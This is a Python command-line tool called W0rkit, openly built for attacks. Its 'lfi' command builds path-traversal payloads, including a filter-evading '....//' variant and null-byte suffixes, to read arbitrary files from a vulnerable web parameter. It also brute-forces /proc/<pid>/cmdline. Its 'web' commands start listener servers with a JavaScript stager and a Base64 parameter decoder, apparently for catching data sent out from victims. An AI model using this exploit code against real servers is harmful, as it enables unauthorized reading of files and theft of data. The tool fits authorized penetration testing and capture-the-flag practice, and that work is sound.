import click
from colorama import Fore, Back, Style, init as colorama_init
import requests
import io
import zipfile

from w0rkit.web.web_modes import SimpleMode, Base64Mode


VERSION = "0.0.2"

colorama_init(autoreset=True)

lfi_modes_to_chars = {"spf": "....//", "default": "../"}


@click.group()
def main():
    print(f"W0rkit CLI {VERSION}")


@main.group()
def web():
    print(f"Web Mode!")


@main.group()
def lfi():
    print(f"LFI Mode!")


def zip_decoder(response, noerr):
    try:
        with zipfile.ZipFile(io.BytesIO(response.content)) as zip_content:
            for zipinfo in zip_content.infolist():
                with zip_content.open(zipinfo) as unzipped_file:
                    yield zipinfo.filename, unzipped_file.read().decode("utf-8")
    except zipfile.BadZipfile:
        # Show error only if not bruteforcing.
        if not noerr:
            click.secho(
                f"{Fore.LIGHTYELLOW_EX}[LFI] {Fore.LIGHTRED_EX} Decoder failed. Either a 404 or you're using an incorrect decoder (ZIP)"
            )


def base64_decoder(response, noerr):
    print("Not implemented yet :(")
    exit()


def no_decoder(response, noerr):
    yield "raw", response.text


lfi_decoder_map = {"zip": zip_decoder, "b64d": base64_decoder}


def handle_lfi_request(target, decoder, noerr=False):
    with requests.Session() as _sess:
        resp = _sess.get(target)
        if decoder:
            decode_func = lfi_decoder_map.get(decoder, no_decoder)
        else:
            decode_func = no_decoder
        for filename, result in decode_func(resp, noerr):
            click.secho(
                f"{Fore.LIGHTYELLOW_EX}[LFI] {Fore.WHITE}Found: {Fore.LIGHTCYAN_EX}{filename}"
            )
            click.secho(f"{Fore.WHITE}{result}")
            click.secho(
                "------------------------------------------------------------------------------"
            )


@lfi.command()
@click.option(
    "-i",
    "--injectable",
    help="The full target where the LFI is present. (ex. http://vuln.site/?download=)",
    required=True,
)
@click.option(
    "--filter-mode",
    help="Specify here if the target is somehow filtering injection. (Current options: 'spf')",
)
@click.option(
    "-s",
    "--suffix",
    help="Specify the suffix to be appended to the LFI payload. (e.g.: %00.pdf)",
    default="",
)
@click.option(
    "--repeat-prefix",
    help="Specify how many times to repeat injection characters. default = 5 (enough to traverse out of most default webroots)",
    default=5,
    type=click.types.INT,
)
@click.option(
    "--decoder",
    help="Use response decoder (e.g. zip) if the server returns the contents as something unexpected.",
)
def interrogate(injectable, filter_mode, suffix, repeat_prefix, decoder):
    injection_char = lfi_modes_to_chars.get("default")
    if filter_mode:
        injection_char = lfi_modes_to_chars.get(filter_mode, None)
    if not injection_char:
        click.secho("Invalid filter mode, defaulting to '../'")
        injection_char = lfi_modes_to_chars.get("default")

    injection_prefix = f"{injection_char}" * repeat_prefix

    try:
        while True:
            click.secho(
                f"{Fore.LIGHTYELLOW_EX}[LFI] {Fore.WHITE} Enter Filepath (from : /) {Style.RESET_ALL}",
                nl=False,
            )
            filepath = input()

            # Linux Proc BF!
            if filepath.startswith("lpbf:"):
                proc_bf_range = filepath.split("lpbf:")[1]
                try:
                    proc_bf_st, proc_bf_end = proc_bf_range.split(",")
                    target_range = range(int(proc_bf_st), int(proc_bf_end) + 1)
                    for procid in target_range:
                        target = f"{injectable}{injection_prefix}/proc/{procid}/cmdline"
                        handle_lfi_request(target, decoder, noerr=True)
                except Exception as ex:
                    click.secho(
                        f"{Fore.LIGHTRED_EX} [LPBF] Invalid path bruteforce range specified. try: 'lpbf:1,1000' for proc/1 to proc/1000"
                    )
            else:
                # Prepare full url
                target = f"{injectable}{injection_prefix}{filepath}{suffix}"
                handle_lfi_request(target, decoder)

    except KeyboardInterrupt:
        click.secho(f"{Fore.LIGHTRED_EX} [SYS] CTRL + C Caught, exiting!")
        exit()


@web.command()
@click.option(
    "-l", "--listen_host", help="Address the server should listen on.", required=True
)
@click.option("-p", "--listen_port", help="Port to listen on.", required=True)
@click.option(
    "-s",
    "--stager",
    is_flag=True,
    default=False,
    help="Enable the JS static web server",
)
@click.option(
    "-r", "--stager_dir", help="Location for the stager to look for static files."
)
def simple(listen_host, listen_port, stager, stager_dir):
    click.secho(
        f"{Fore.CYAN}Stager: {f'{Fore.LIGHTGREEN_EX}ON' if stager else f'{Fore.LIGHTRED_EX}OFF'}{Style.RESET_ALL}"
    )
    app = SimpleMode(
        listen_host=listen_host,
        listen_port=listen_port,
        stager=stager,
        stager_dir=stager_dir,
    )
    app.run()


@web.command()
@click.option(
    "-l", "--listen_host", help="Address the server should listen on.", required=True
)
@click.option("-p", "--listen_port", help="Port to listen on.", required=True)
@click.option(
    "-m", "--magic_param", help="The GET parameter containing your base64 data."
)
@click.option(
    "-s",
    "--stager",
    is_flag=True,
    default=False,
    help="Enable the JS static web server",
)
@click.option(
    "-r", "--stager_dir", help="Location for the stager to look for static files."
)
def b64d(listen_host, listen_port, magic_param, stager, stager_dir):
    click.secho(
        f"{Fore.CYAN}Stager: {f'{Fore.LIGHTGREEN_EX}ON' if stager else f'{Fore.LIGHTRED_EX}OFF'}{Style.RESET_ALL}"
    )
    app = Base64Mode(
        magic_param=magic_param,
        listen_host=listen_host,
        listen_port=listen_port,
        stager=stager,
        stager_dir=stager_dir,
    )
    app.run()


def showmode(mode, host, port, **kwargs):
    click.secho(
        f"{Fore.LIGHTYELLOW_EX}{mode} {Fore.LIGHTCYAN_EX}mode. Running on {Fore.WHITE}{host}:{port}{Style.RESET_ALL}"
    )

    # Magic param set?
    magic_param = kwargs.get("magic_param", None)
    if magic_param:
        click.secho(f"{Fore.LIGHTCYAN_EX}Checking parameter: {Fore.WHITE}{magic_param}")
